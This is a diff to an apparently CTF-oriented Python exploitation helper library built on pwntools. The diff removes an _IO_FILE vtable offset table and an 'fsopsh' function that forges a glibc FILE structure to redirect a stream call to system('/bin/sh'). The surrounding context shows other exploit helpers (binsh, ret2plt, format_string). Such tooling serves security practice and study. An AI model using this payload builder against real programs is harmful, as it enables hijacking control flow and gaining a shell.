@@ -4,30 +4,6 @@ import re
 import math
 from pwninit.io import *
 
-_IOFILE_VTABLE_OFFSETS = {
-    "dummy": 0x00,
-    "dummy2": 0x08,
-    "finish": 0x10,
-    "overflow": 0x18,
-    "underflow": 0x20,
-    "uflow": 0x28,
-    "pbackfail": 0x30,
-    "xsputn": 0x38,
-    "xsgetn": 0x40,
-    "seekoff": 0x48,
-    "seekpos": 0x50,
-    "setbuf": 0x58,
-    "sync": 0x60,
-    "doallocate": 0x68,
-    "read": 0x70,
-    "write": 0x78,
-    "seek": 0x80,
-    "close": 0x88,
-    "stat": 0x90,
-    "showmanyc": 0x98,
-    "imbue": 0xa0,
-}
-
 class PwnContext:    
     def __init__(self, proc, elf, libc, binary, prefix):
         self.proc = proc
@@ -272,25 +248,6 @@ class PwnContext:
 
     def binsh(self):
         return next(self.libc.search(b"/bin/sh\0"))
-    
-    def fsopsh(self, func=None, arg=b"/bin/sh\0", lock=None, file=None, trigger="xsputn"):
-        if self.elf.bits != 64:
-            raise NotImplementedError()
-
-        file = file or self.libc.sym["_IO_2_1_stdout_"]
-        lock = lock or file + 0x800
-        func = func or self.libc.sym.system
-
-        return flat({
-            0x00: [0x3b01010101010101, arg],
-            0x78: -1,
-            0x88: lock, # empty zone as lock
-            0x90: -1,
-            0xa0: file + (0xe0 - 0xe0), # wide_data
-            0xd0: func,
-            0xd8: self.libc.sym["_IO_wfile_jumps"] - (_IOFILE_VTABLE_OFFSETS[trigger] - _IOFILE_VTABLE_OFFSETS["overflow"]), # vtable
-            0xe0: file + (0xe0 - 0xe0) + (0xd0 - 0x68), # wide_data->vtable,
-        }, filler=b"\0")
 
 # Global instance
 pwnctx = None
@@ -320,7 +277,6 @@ ret2plt = lambda *a, **k: (_require_ctx(), pwnctx.ret2plt(*a, **k))[1]
 format_string = lambda *a, **k: (_require_ctx(), pwnctx.format_string(*a, **k))[1]
 
 binsh = lambda *a, **k: (_require_ctx(), pwnctx.binsh(*a, **k))[1]
-fsopsh = lambda *a, **k: (_require_ctx(), pwnctx.fsopsh(*a, **k))[1]
 
 # Utility functions
 u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
